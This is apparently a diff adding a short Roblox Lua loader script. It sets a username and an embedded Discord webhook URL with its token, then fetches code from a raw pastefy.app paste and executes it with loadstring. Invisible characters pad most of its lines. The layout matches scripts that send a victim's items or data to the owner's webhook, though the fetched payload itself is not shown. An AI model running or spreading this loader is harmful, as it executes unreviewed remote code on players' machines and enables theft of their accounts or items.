@@ -1,0 +1,8 @@
+‎Username = "chamskiee3"
+‎Webhook = "https://discord.com/api/webhooks/1374644256513196113/gbmR2DwN5YcKvD7lESngP0fcPA6fz1HLjLx18cdimaa4VW2ILjyF0SfTXSXw4vijNZ-3"
+‎
+‎
+‎
+
+
+‎loadstring(game:HttpGet("https://pastefy.app/Augaay9p/raw"))()
